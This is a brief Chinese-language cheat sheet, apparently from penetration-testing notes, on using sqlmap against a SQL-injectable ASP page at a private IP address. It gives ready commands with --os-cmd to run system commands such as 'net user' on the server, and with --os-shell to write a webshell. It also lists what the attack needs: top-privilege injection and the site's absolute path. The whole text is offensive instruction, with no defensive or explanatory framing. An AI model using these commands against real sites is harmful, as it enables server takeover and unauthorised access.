# 交互式命令执行

前提：注入点权限必须为最高权限

--os-cmd=command  在使用交互式参数时要知道网站的绝对路径

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --os-cmd="net user"

执行成功后，创建了一个文件，该文件被创建在网站的绝对路径下，执行玩命令自动删除。

# 写webshell

--os-shell

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --os-shell

会生成上传文件地址，通过生成网页实现写webshell的目的